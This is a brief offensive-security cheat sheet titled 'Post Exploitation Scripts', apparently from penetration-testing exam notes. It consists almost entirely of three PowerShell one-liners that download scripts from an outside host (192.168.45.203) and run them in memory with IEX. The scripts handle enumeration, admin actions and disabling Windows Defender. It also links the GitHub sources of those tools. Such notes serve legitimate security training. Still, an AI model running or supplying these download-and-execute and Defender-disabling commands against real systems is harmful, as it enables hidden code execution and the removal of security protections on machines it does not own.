# Name
Post Exploitation Scripts

## Usage
```
powershell -c "IEX (new-object system.net.webclient).downloadstring('http://192.168.45.203/post_enum.ps1')"

powershell -c "IEX (new-object system.net.webclient).downloadstring('http://192.168.45.203/post_admin.ps1')"

powershell -c "IEX (new-object system.net.webclient).downloadstring('http://192.168.45.203/DisableDefender.ps1')"
```

## Source
https://raw.githubusercontent.com/jayesther/OSEP_OSED_TOOLS/refs/heads/main/OSEP_enum.ps1
https://raw.githubusercontent.com/TapXWorld/osep_tools/refs/heads/main/Bypass_Defender/DisableDefender.ps1

